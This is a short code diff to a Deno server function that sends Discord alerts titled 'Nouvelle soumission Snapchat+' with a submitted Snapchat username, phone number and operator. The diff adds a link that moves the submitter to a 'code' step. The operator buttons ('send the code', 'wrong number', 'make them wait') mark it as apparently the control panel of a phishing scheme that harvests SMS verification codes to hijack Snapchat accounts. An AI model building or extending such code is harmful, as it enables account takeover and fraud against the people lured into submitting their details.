@@ -16,6 +16,9 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
+  const appUrl = req.headers.get("origin") || "https://yourapp.base44.app";
+  const codePageUrl = `${appUrl}/?step=code&snap=${encodeURIComponent(snapchat)}&tel=${encodeURIComponent(telephone)}`;
+
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -27,7 +30,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: "✅ **Envoyer le code**\n❌ **Mauvais numéro**\n⏳ **Faire patienter**",
+        value: `✅ [Envoyer le code](${codePageUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
         inline: false
       },
     ],
